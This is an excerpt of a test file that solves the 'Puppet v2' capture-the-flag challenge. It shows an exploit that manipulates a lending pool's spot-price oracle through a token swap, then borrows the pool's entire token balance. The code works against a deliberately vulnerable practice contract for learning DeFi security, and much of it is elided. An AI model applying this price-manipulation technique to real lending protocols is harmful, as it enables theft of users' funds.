...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        /**The price can be manipulated in the same way as the previous problem. All we need to do is swap our DVT 
            tokens for ETH, wrap the ETH, approve and borrow all the tokens from the lending pool. */
        ...
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.lt(attacker_balance.sub(ethers.utils.parseEther('0.1')));
        ...
        await this.weth.connect(attacker).approve(
            this.lendingPool.address, attacker_balance.sub(ethers.utils.parseEther('0.1'))
        );

        // borrow all tokens
        const tx_borrow = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
        await tx_borrow.wait();
    });
